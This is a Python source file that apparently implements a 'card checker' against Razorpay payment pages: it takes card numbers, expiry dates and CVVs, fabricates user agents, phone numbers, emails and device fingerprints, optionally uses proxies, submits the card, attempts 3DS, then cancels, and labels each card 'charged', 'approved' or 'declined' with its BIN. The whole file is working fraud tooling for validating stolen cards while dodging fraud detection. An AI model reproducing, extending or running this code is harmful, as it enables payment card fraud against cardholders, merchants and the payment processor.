"""
core/razorpay_engine.py — Full 9-step Razorpay flow
Real charge only when razorpay_payment_id is returned in cancel response.
"""
import asyncio
import base64
import hashlib
import json
import logging
import random
import re
import secrets
import string
import time
from typing import Any, Dict, Optional
from urllib.parse import quote

import aiohttp

from config import CARD_TIMEOUT, FORCE_AMOUNT, RZP_BUILD, RZP_BUILD_V1

logger = logging.getLogger("nagu.rzp")


# ─── Helpers ──────────────────────────────────────────────────────────────────

def _gen_ua() -> str:
    maj  = random.randint(120, 148)
    bld  = random.randint(5000, 7000)
    ptch = random.randint(50, 250)
    return (
        f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        f"AppleWebKit/537.36 (KHTML, like Gecko) "
        f"Chrome/{maj}.0.{bld}.{ptch} Safari/537.36"
    )


def _gen_phone() -> str:
    return "+91" + random.choice(["6", "7", "8", "9"]) + "".join(
        str(random.randint(0, 9)) for _ in range(9)
    )


def _gen_email() -> str:
    names = ["alex", "john", "mike", "sara", "david", "emma", "james", "lisa", "chris", "anna"]
    return random.choice(names) + str(random.randint(100, 9999)) + "@gmail.com"


def _gen_device():
    buf    = secrets.token_bytes(16)
    h      = hashlib.sha1(buf).hexdigest()
    ts     = str(int(time.time() * 1000))
    dev_id = f"1.{h}.{ts}.{random.randint(0, 99999999):08d}"
    return dev_id, h


def _gs(d: dict, k: str) -> str:
    v = d.get(k) if d else None
    return v if isinstance(v, str) else (str(v) if v is not None else "")


def _is_live_signal(desc: str, code: str) -> bool:
    ml = desc.lower()
    return any(
        kw in ml
        for kw in [
            "insufficient", "balance", "funds", "cvv", "auth",
            "3d", "3ds", "otp", "declined by bank", "do_not_honor",
            "transaction_not", "card_holder", "authentication",
            "blocked", "limit", "expired", "incorrect_cvv",
        ]
    ) or "incorrect_cvv" in code.lower()


# ─── Main engine ──────────────────────────────────────────────────────────────

async def check_card(
    cc: str,
    mm: str,
    yy: str,
    cvv: str,
    site: Dict,
    proxy_url: Optional[str] = None,
    amount: int = FORCE_AMOUNT,
) -> Dict[str, Any]:
    """
    Full 9-step Razorpay payment flow.

    Returns dict with keys:
        status  : "charged" | "approved" | "declined" | "error"
        message : human-readable response string
        bin     : BIN6 (on charged/approved)
        payment_id : Razorpay payment ID (on charged only)

    A card is only "charged" when razorpay_payment_id appears in the
    cancel-step response — meaning the payment actually went through.
    """
    yy2    = yy[-2:] if len(yy) == 4 else yy
    ua     = _gen_ua()
    phone  = _gen_phone()
    email  = _gen_email()
    dev_id, fhash = _gen_device()
    sess_id = "".join(secrets.choice(string.ascii_letters + string.digits) for _ in range(14))

    kw        = {"proxy": proxy_url} if proxy_url else {}
    target_url = site["url"]
    key_id    = site["key_id"]
    plink     = site["plink"]
    ppid      = site["ppid"]
    keyless   = site["keyless"]
    kl_enc    = quote(keyless) if keyless else ""

    conn = aiohttp.TCPConnector(ssl=False)
    jar  = aiohttp.CookieJar(unsafe=True)

    async with aiohttp.ClientSession(
        connector=conn,
        cookie_jar=jar,
        headers={
            "User-Agent":      ua,
            "Accept-Language": "en-US,en;q=0.5",
        },
        timeout=aiohttp.ClientTimeout(total=CARD_TIMEOUT),
    ) as sess:

        # ── Step 3: Create order ─────────────────────────────────────────────
        try:
            async with sess.post(
                f"https://api.razorpay.com/v1/payment_pages/{plink}/order",
                json={
                    "notes": {"comment": "", "name": "User"},
                    "line_items": [{"payment_page_item_id": ppid, "amount": amount}],
                },
                headers={
                    "Accept":        "application/json",
                    "Content-Type":  "application/json",
                    "Origin":        "https://pages.razorpay.com",
                    "Referer":       "https://pages.razorpay.com/",
                },
                **kw,
            ) as r2:
                r2d = json.loads(await r2.text(errors="replace"))
        except Exception as ex:
            return {"status": "error", "message": f"Order: {str(ex)[:50]}"}

        order_obj = r2d.get("order", {}) or {}
        order_id  = _gs(order_obj, "id")
        if not order_id:
            desc = _gs(r2d.get("error", {}), "description") or "Order failed"
            return {"status": "error", "message": desc[:80]}

        ckid = order_id.split("_", 1)[1] if "_" in order_id else order_id
        oamt = float(order_obj.get("amount") or amount)
        if oamt < 100:
            oamt = float(amount)
        ocur = _gs(order_obj, "currency") or "INR"

        # ── Step 4: Session token ────────────────────────────────────────────
        try:
            async with sess.get(
                "https://api.razorpay.com/v1/checkout/public",
                params={
                    "traffic_env":        "production",
                    "build":              RZP_BUILD,
                    "build_v1":           RZP_BUILD_V1,
                    "checkout_v2":        "1",
                    "new_session":        "1",
                    "keyless_header":     keyless,
                    "rzp_device_id":      dev_id,
                    "unified_session_id": sess_id,
                },
                headers={"Accept": "text/html,*/*", "Referer": "https://pages.razorpay.com/"},
                **kw,
            ) as r3:
                r3t = await r3.text(errors="replace")
        except Exception as ex:
            return {"status": "error", "message": f"Session: {str(ex)[:50]}"}

        tok = ""
        m = re.search(r'window\.session_token="([A-F0-9]{40,})"', r3t)
        if m:
            tok = m.group(1)
        if not tok:
            m2 = re.search(
                r'session_token[\'"]?\s*[:=]\s*[\'"]([A-F0-9]{40,})[\'"]', r3t
            )
            if m2:
                tok = m2.group(1)
        if not tok:
            return {"status": "error", "message": "No session token"}

        rzp_ref = (
            f"https://api.razorpay.com/v1/checkout/public?"
            f"traffic_env=production&build={RZP_BUILD}"
            f"&build_v1={RZP_BUILD_V1}&checkout_v2=1"
            f"&new_session=1&unified_session_id={sess_id}&session_token={tok}"
        )
        sh = {
            "Accept":          "*/*",
            "Origin":          "https://api.razorpay.com",
            "Referer":         rzp_ref,
            "x-session-token": tok,
        }

        # ── Steps 5-7: Prefs / checkout / cross-border (fire-and-forget) ────
        for _coro in [
            sess.post(
                f"https://api.razorpay.com/v2/standard_checkout/preferences"
                f"?x_entity_id={order_id}&session_token={tok}&keyless_header={keyless}",
                json={
                    "query": [{"resource": r} for r in [
                        "checkout_version_config", "merchant",
                        "methods", "order", "experiments",
                    ]],
                    "query_params": {
                        "device_id":      dev_id,
                        "amount":         oamt,
                        "currency":       ocur,
                        "order_id":       order_id,
                        "payment_link_id": plink,
                        "contact":        phone,
                    },
                    "action": "get",
                },
                headers={**sh, "Content-Type": "application/json"},
                **kw,
            ),
            sess.post(
                f"https://api.razorpay.com/v1/standard_checkout/checkout/order"
                f"?key_id={key_id}&session_token={tok}&keyless_header={keyless}",
                data={
                    "notes[email]":      email,
                    "notes[phone]":      phone[3:],
                    "payment_link_id":   plink,
                    "key_id":            key_id,
                    "contact":           phone,
                    "email":             email,
                    "currency":          ocur,
                    "_[integration]":    "payment_pages",
                    "_[device.id]":      dev_id,
                    "_[library]":        "checkoutjs",
                    "_[platform]":       "browser",
                    "_[shield][fhash]":  fhash,
                    "_[shield][tz]":     "0",
                    "_[device_id]":      dev_id,
                    "_[build]":          RZP_BUILD,
                    "_[shield][os]":     "windows",
                    "_[shield][browser]": "chrome",
                    "_[request_index]":  "0",
                    "amount":            str(int(oamt)),
                    "order_id":          order_id,
                    "method":            "card",
                    "checkout_id":       ckid,
                },
                headers={**sh, "Content-Type": "application/x-www-form-urlencoded"},
                **kw,
            ),
        ]:
            try:
                await _coro
            except Exception:
                pass

        # ── Step 8: Submit card ──────────────────────────────────────────────
        sardine = base64.b64encode(
            json.dumps(
                [{"name": "sardine", "metadata": {"session_id": ckid}}]
            ).encode()
        ).decode()

        form8 = {
            "user_risk_providers_token":    sardine,
            "notes[comment]":               "",
            "notes[email]":                 email,
            "notes[phone]":                 phone[3:],
            "notes[name]":                  "User",
            "payment_link_id":              plink,
            "key_id":                       key_id,
            "contact":                      phone,
            "email":                        email,
            "currency":                     ocur,
            "_[integration]":               "payment_pages",
            "_[checkout_id]":               ckid,
            "_[device.id]":                 dev_id,
            "_[env]":                       "",
            "_[library]":                   "checkoutjs",
            "_[library_src]":               "no-src",
            "_[current_script_src]":        "no-src",
            "_[is_magic_script]":           "false",
            "_[platform]":                  "browser",
            "_[referer]":                   target_url,
            "_[shield][fhash]":             fhash,
            "_[shield][tz]":                "-330",
            "_[device_id]":                 dev_id,
            "_[build]":                     RZP_BUILD,
            "_[shield][os]":                "windows",
            "_[shield][platform]":          "browser",
            "_[shield][browser]":           "chrome",
            "_[request_index]":             "1",
            "amount":                       str(int(oamt)),
            "order_id":                     order_id,
            "method":                       "card",
            "card[number]":                 cc,
            "card[cvv]":                    cvv,
            "card[name]":                   "User",
            "card[expiry_month]":           mm,
            "card[expiry_year]":            f"20{yy2}",
            "save":                         "0",
            "dcc_currency":                 ocur,
        }

        try:
            async with sess.post(
                f"https://api.razorpay.com/v1/standard_checkout/payments/create/ajax"
                f"?x_entity_id={order_id}&session_token={tok}&keyless_header={keyless}",
                data=form8,
                headers=sh,
                **kw,
            ) as r8:
                r8d = json.loads(await r8.text(errors="replace"))
        except asyncio.TimeoutError:
            return {"status": "error", "message": "Timeout"}
        except Exception as ex:
            return {"status": "error", "message": str(ex)[:60]}

        pay_id = _gs(r8d, "payment_id") or _gs(r8d, "id")
        if not pay_id:
            err   = r8d.get("error", {}) or {}
            desc  = _gs(err, "description").replace(
                " Try another payment method or contact your bank for details.", ""
            ).strip()
            code  = _gs(err, "reason")
            label = f"{desc} ({code})" if code else desc or "Unknown decline"
            if _is_live_signal(desc, code):
                return {"status": "approved", "message": label, "bin": cc[:6]}
            return {"status": "declined", "message": label}

        pid_c = pay_id.split("_", 1)[1] if "_" in pay_id else pay_id

        # ── Step 9a: Authenticate (3DS) ──────────────────────────────────────
        for auth_url in [
            f"https://api.razorpay.com/pg_router/v1/payments/{pay_id}/authenticate",
            f"https://api.razorpay.com/pg_router/v1/payments/{pid_c}/authenticate",
        ]:
            try:
                await sess.post(
                    auth_url,
                    data={
                        "browser[java_enabled]":       "false",
                        "browser[javascript_enabled]": "true",
                        "browser[timezone_offset]":    "0",
                        "browser[color_depth]":        "24",
                        "browser[screen_width]":       "1920",
                        "browser[screen_height]":      "1080",
                        "browser[language]":           "en-US",
                        "auth_step":                   "3ds2Auth",
                    },
                    headers={"Content-Type": "application/x-www-form-urlencoded"},
                    **kw,
                )
            except Exception:
                pass

        await asyncio.sleep(0.8)

        # ── Step 9b: Cancel (verify actual charge) ───────────────────────────
        # A "charged" verdict is returned ONLY if razorpay_payment_id
        # appears in the cancel response — meaning Razorpay confirmed
        # the payment before we could cancel it.
        try:
            async with sess.get(
                f"https://api.razorpay.com/v1/standard_checkout/payments/{pay_id}/cancel"
                f"?key_id={key_id}&session_token={tok}&keyless_header={keyless}",
                headers={**sh, "Content-type": "application/x-www-form-urlencoded"},
                **kw,
            ) as r9:
                r9t = await r9.text(errors="replace")
        except Exception:
            return {"status": "approved", "message": "Auth passed", "bin": cc[:6]}

        # Only mark as charged when Razorpay sends back the payment confirmation
        if "razorpay_payment_id" in r9t:
            return {
                "status":     "charged",
                "message":    "Payment Successful",
                "payment_id": pay_id,
                "bin":        cc[:6],
            }

        try:
            r9d = json.loads(r9t)
        except Exception:
            return {"status": "declined", "message": "Unknown"}

        err   = r9d.get("error", {}) or {}
        desc  = _gs(err, "description").replace(
            " Try another payment method or contact your bank for details.", ""
        ).strip()
        code  = _gs(err, "reason")
        label = f"{desc} ({code})" if code else desc or "Unknown"

        if _is_live_signal(desc, code):
            return {"status": "approved", "message": label, "bin": cc[:6]}
        return {"status": "declined", "message": label}
